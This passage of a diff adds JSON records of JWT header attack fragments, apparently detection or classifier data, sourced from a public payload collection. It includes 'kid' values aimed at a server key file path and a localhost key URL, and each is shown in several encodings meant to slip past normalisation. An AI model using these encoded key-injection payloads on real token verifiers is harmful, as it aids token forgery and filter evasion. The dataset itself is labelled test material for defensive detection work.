+    "obfuscation_chain": [
+      "url_encode_unreserved",
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode",
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 65766112,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00010__obf01",
+    "payload": "%22alg%22%3A%20%22HS256%22%2C",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "af65a6da7ea89e197a400e3c1155646edf9f6db4cec1f8aaa6613d1694d82aa1",
+    "original_id": "raw_jwt_00010",
+    "original_payload": "\"alg\": \"HS256\",",
+    "obfuscated_payload": "%22alg%22%3A%20%22HS256%22%2C",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65863088,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00010__obf02",
+    "payload": "ImFsZyI6ICJIUzI1NiIs",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "af65a6da7ea89e197a400e3c1155646edf9f6db4cec1f8aaa6613d1694d82aa1",
+    "original_id": "raw_jwt_00010",
+    "original_payload": "\"alg\": \"HS256\",",
+    "obfuscated_payload": "ImFsZyI6ICJIUzI1NiIs",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 65864097,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00010__obf03",
+    "payload": "\"%61lg\": \"H%5325%36\",",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "af65a6da7ea89e197a400e3c1155646edf9f6db4cec1f8aaa6613d1694d82aa1",
+    "original_id": "raw_jwt_00010",
+    "original_payload": "\"alg\": \"HS256\",",
+    "obfuscated_payload": "\"%61lg\": \"H%5325%36\",",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65865106,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00010__obf04",
+    "payload": "%22alg%22:%20\"HS256%22%2C",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "af65a6da7ea89e197a400e3c1155646edf9f6db4cec1f8aaa6613d1694d82aa1",
+    "original_id": "raw_jwt_00010",
+    "original_payload": "\"alg\": \"HS256\",",
+    "obfuscated_payload": "%22alg%22:%20\"HS256%22%2C",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65866115,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00011__obf01",
+    "payload": "%2522kid%2522%253A%2520%2522%252Froot%252Fres%252Fkeys%252Fsecret.key%2522",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "aade06cdc4dcc5b3e13074130ebc10bd10603c1a77816a9b7de7fa3c578d8c0a",
+    "original_id": "raw_jwt_00011",
+    "original_payload": "\"kid\": \"/root/res/keys/secret.key\"",
+    "obfuscated_payload": "%2522kid%2522%253A%2520%2522%252Froot%252Fres%252Fkeys%252Fsecret.key%2522",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 65963091,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00011__obf02",
+    "payload": "ImtpZCI6ICIvcm9vdC9yZXMva2V5cy9zZWNyZXQua2V5Ig==",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "aade06cdc4dcc5b3e13074130ebc10bd10603c1a77816a9b7de7fa3c578d8c0a",
+    "original_id": "raw_jwt_00011",
+    "original_payload": "\"kid\": \"/root/res/keys/secret.key\"",
+    "obfuscated_payload": "ImtpZCI6ICIvcm9vdC9yZXMva2V5cy9zZWNyZXQua2V5Ig==",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 65964100,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00011__obf03",
+    "payload": "\"kid\": \"/root/%72%65s/keys/s%65%63r%65t=.k%65y\"==",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "aade06cdc4dcc5b3e13074130ebc10bd10603c1a77816a9b7de7fa3c578d8c0a",
+    "original_id": "raw_jwt_00011",
+    "original_payload": "\"kid\": \"/root/res/keys/secret.key\"",
+    "obfuscated_payload": "\"kid\": \"/root/%72%65s/keys/s%65%63r%65t=.k%65y\"==",
+    "obfuscation_chain": [
+      "url_encode_unreserved",
+      "jwt_padding"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65965109,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00011__obf04",
+    "payload": "%22kid%22%3A%20%22%2Froot%2Fres%2Fkeys%2Fsecret%3D%3D%3D.key%22",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "aade06cdc4dcc5b3e13074130ebc10bd10603c1a77816a9b7de7fa3c578d8c0a",
+    "original_id": "raw_jwt_00011",
+    "original_payload": "\"kid\": \"/root/res/keys/secret.key\"",
+    "obfuscated_payload": "%22kid%22%3A%20%22%2Froot%2Fres%2Fkeys%2Fsecret%3D%3D%3D.key%22",
+    "obfuscation_chain": [
+      "jwt_padding",
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65966118,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00012__obf01",
+    "payload": "%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2522alg%2522%253A%2522RS256%2522%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2522typ%2522%253A%2522JWT%2522%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2522kid%2522%253A%2522http%253A%252F%252Flocalhost%253A7070%252FprivKey.key%2522%250A%2520%2520%2520%2520%257D",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "56a5f6b9baeb3b9d9914918f55b6d6004ba337974516767b1ffd0bcdb623291b",
+    "original_id": "raw_jwt_00012",
+    "original_payload": "{\n        \"alg\":\"RS256\",\n        \"typ\":\"JWT\",\n        \"kid\":\"http://localhost:7070/privKey.key\"\n    }",
+    "obfuscated_payload": "%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2522alg%2522%253A%2522RS256%2522%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2522typ%2522%253A%2522JWT%2522%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2522kid%2522%253A%2522http%253A%252F%252Flocalhost%253A7070%252FprivKey.key%2522%250A%2520%2520%2520%2520%257D",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 66063094,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00012__obf02",
+    "payload": "ewogICAgICAgICJhbGciOiJSUzI1NiIsCiAgICAgICAgInR5cCI6IkpXVCIsCiAgICAgICAgImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSIKICAgIH0",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "56a5f6b9baeb3b9d9914918f55b6d6004ba337974516767b1ffd0bcdb623291b",
+    "original_id": "raw_jwt_00012",
+    "original_payload": "{\n        \"alg\":\"RS256\",\n        \"typ\":\"JWT\",\n        \"kid\":\"http://localhost:7070/privKey.key\"\n    }",
+    "obfuscated_payload": "ewogICAgICAgICJhbGciOiJSUzI1NiIsCiAgICAgICAgInR5cCI6IkpXVCIsCiAgICAgICAgImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSIKICAgIH0",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 66064103,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00012__obf03",
+    "payload": "{\n        \"alg\":\"R%53%3256\",\n        \"typ\":\"%4AWT\",\n        \"kid\":\"ht%74p://localh%6Fst:7%3070/%70rivKey==.key\"\n    }==",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "56a5f6b9baeb3b9d9914918f55b6d6004ba337974516767b1ffd0bcdb623291b",
+    "original_id": "raw_jwt_00012",
+    "original_payload": "{\n        \"alg\":\"RS256\",\n        \"typ\":\"JWT\",\n        \"kid\":\"http://localhost:7070/privKey.key\"\n    }",
+    "obfuscated_payload": "{\n        \"alg\":\"R%53%3256\",\n        \"typ\":\"%4AWT\",\n        \"kid\":\"ht%74p://localh%6Fst:7%3070/%70rivKey==.key\"\n    }==",
+    "obfuscation_chain": [
+      "jwt_padding",
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 66065112,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00012__obf04",
+    "payload": "ewogICAgICAgICJhbGciOiJSUzI1NiIsCiAgICAgICAgInR5cCI6IkpXVCIsCiAgICAgICAgImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5PT0ua2V5IgogICAgfT09",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "56a5f6b9baeb3b9d9914918f55b6d6004ba337974516767b1ffd0bcdb623291b",
+    "original_id": "raw_jwt_00012",
+    "original_payload": "{\n        \"alg\":\"RS256\",\n        \"typ\":\"JWT\",\n        \"kid\":\"http://localhost:7070/privKey.key\"\n    }",
+    "obfuscated_payload": "ewogICAgICAgICJhbGciOiJSUzI1NiIsCiAgICAgICAgInR5cCI6IkpXVCIsCiAgICAgICAgImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5PT0ua2V5IgogICAgfT09",
+    "obfuscation_chain": [
+      "jwt_padding",
+      "base64_standard"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 66066121,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00013__obf01",
+    "payload": "%22alg%22%3A%22RS256%22%2C",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "3fc931ba48a921c4344ec47a3ea1fac822da6cbdc43c07a4ee674d5093238537",
+    "original_id": "raw_jwt_00013",
+    "original_payload": "\"alg\":\"RS256\",",
+    "obfuscated_payload": "%22alg%22%3A%22RS256%22%2C",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 66163097,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00013__obf02",
+    "payload": "ImFsZyI6IlJTMjU2Iiw",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "3fc931ba48a921c4344ec47a3ea1fac822da6cbdc43c07a4ee674d5093238537",
+    "original_id": "raw_jwt_00013",
+    "original_payload": "\"alg\":\"RS256\",",
+    "obfuscated_payload": "ImFsZyI6IlJTMjU2Iiw",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 66164106,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00013__obf03",
+    "payload": "\"%61lg\":\"%52S256\",",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "3fc931ba48a921c4344ec47a3ea1fac822da6cbdc43c07a4ee674d5093238537",
+    "original_id": "raw_jwt_00013",
+    "original_payload": "\"alg\":\"RS256\",",
+    "obfuscated_payload": "\"%61lg\":\"%52S256\",",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 66165115,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00013__obf04",
+    "payload": "ImFsZyI6IlJTMjU2Iiw=",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "3fc931ba48a921c4344ec47a3ea1fac822da6cbdc43c07a4ee674d5093238537",
+    "original_id": "raw_jwt_00013",
+    "original_payload": "\"alg\":\"RS256\",",
+    "obfuscated_payload": "ImFsZyI6IlJTMjU2Iiw=",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 66166124,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00014__obf01",
+    "payload": "\"kid\":\"%68ttp://localhos%74:%37070/p%72ivKe%79.key\"",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00014",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "25b5f6ad794f92902317d418f44b382a8a1593c6410c2354ef203a228bb14d38",
+    "original_id": "raw_jwt_00014",
+    "original_payload": "\"kid\":\"http://localhost:7070/privKey.key\"",
+    "obfuscated_payload": "\"kid\":\"%68ttp://localhos%74:%37070/p%72ivKe%79.key\"",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 66263100,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00014__obf02",
+    "payload": "ImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSI",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00014",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "25b5f6ad794f92902317d418f44b382a8a1593c6410c2354ef203a228bb14d38",
+    "original_id": "raw_jwt_00014",
+    "original_payload": "\"kid\":\"http://localhost:7070/privKey.key\"",
+    "obfuscated_payload": "ImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSI",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 66264109,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00014__obf03",
+    "payload": "\"ki%64\":\"http://%6c%6F%63a%6chos%74:%37070/%70ri%76K%65y.key\"",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00014",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "25b5f6ad794f92902317d418f44b382a8a1593c6410c2354ef203a228bb14d38",
+    "original_id": "raw_jwt_00014",
+    "original_payload": "\"kid\":\"http://localhost:7070/privKey.key\"",
+    "obfuscated_payload": "\"ki%64\":\"http://%6c%6F%63a%6chos%74:%37070/%70ri%76K%65y.key\"",
+    "obfuscation_chain": [
+      "url_encode_unreserved",
+      "percent_hex_case"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 66265118,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00014__obf04",
+    "payload": "ImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSI=",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00014",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "25b5f6ad794f92902317d418f44b382a8a1593c6410c2354ef203a228bb14d38",
+    "original_id": "raw_jwt_00014",
+    "original_payload": "\"kid\":\"http://localhost:7070/privKey.key\"",
+    "obfuscated_payload": "ImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSI=",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 66266127,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00015__obf01",
+    "payload": "%22kid%22%3A%20%22beaefa6f-8a50-42b9-805a-0ab63c3acc54%22%2C",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "a5b0414c1f6d28e991a87fddeceeb1f4cd59e280af8c647f9d3cc59f2005d211",
+    "original_id": "raw_jwt_00015",
+    "original_payload": "\"kid\": \"beaefa6f-8a50-42b9-805a-0ab63c3acc54\",",
+    "obfuscated_payload": "%22kid%22%3A%20%22beaefa6f-8a50-42b9-805a-0ab63c3acc54%22%2C",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 66363103,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00015__obf02",
+    "payload": "ImtpZCI6ICJiZWFlZmE2Zi04YTUwLTQyYjktODA1YS0wYWI2M2MzYWNjNTQiLA",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "a5b0414c1f6d28e991a87fddeceeb1f4cd59e280af8c647f9d3cc59f2005d211",
+    "original_id": "raw_jwt_00015",
+    "original_payload": "\"kid\": \"beaefa6f-8a50-42b9-805a-0ab63c3acc54\",",
+    "obfuscated_payload": "ImtpZCI6ICJiZWFlZmE2Zi04YTUwLTQyYjktODA1YS0wYWI2M2MzYWNjNTQiLA",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 66364112,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00015__obf03",
+    "payload": "\"kid\": \"b%65aef%61%36f-%38a%350-42b9-%3805a-0%61b63c3a%63c%354\",",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "a5b0414c1f6d28e991a87fddeceeb1f4cd59e280af8c647f9d3cc59f2005d211",
+    "original_id": "raw_jwt_00015",
+    "original_payload": "\"kid\": \"beaefa6f-8a50-42b9-805a-0ab63c3acc54\",",
+    "obfuscated_payload": "\"kid\": \"b%65aef%61%36f-%38a%350-42b9-%3805a-0%61b63c3a%63c%354\",",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 66365121,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00015__obf04",
+    "payload": "\"ki%64\": \"b%65aefa6f-8a50%2D4%32b9-805a%2D0ab6%33c3acc5%34\",",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00015",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "a5b0414c1f6d28e991a87fddeceeb1f4cd59e280af8c647f9d3cc59f2005d211",
+    "original_id": "raw_jwt_00015",
+    "original_payload": "\"kid\": \"beaefa6f-8a50-42b9-805a-0ab63c3acc54\",",
+    "obfuscated_payload": "\"ki%64\": \"b%65aefa6f-8a50%2D4%32b9-805a%2D0ab6%33c3acc5%34\",",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 66366130,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00016__obf01",
